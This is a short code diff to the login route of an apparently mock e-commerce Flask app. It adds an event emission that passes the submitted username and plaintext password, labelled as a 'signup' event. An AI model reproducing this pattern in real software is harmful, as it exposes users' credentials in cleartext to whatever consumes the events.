@@ -12,6 +12,7 @@ from collections import Counter
 from flask import Blueprint, Response, abort, jsonify, redirect, render_template, request, session, url_for
 from app import db
 from app.db import _deserialize_row
+from app.events import emit
 
 SITE = "e-commerce"
 SITE_DIR = pathlib.Path(__file__).resolve().parent
@@ -496,6 +497,7 @@ def login_submit():
         return render_template("e-commerce/login.html",
                                error="Invalid username or password")
     session["user_id"] = user["id"]
+    emit("signup", user_id=user["id"], site_name="e-commerce", username=request.form.get("username", ""), password=request.form.get("password", ""), email="")
     return redirect(url_for("e-commerce.index"))
 
 
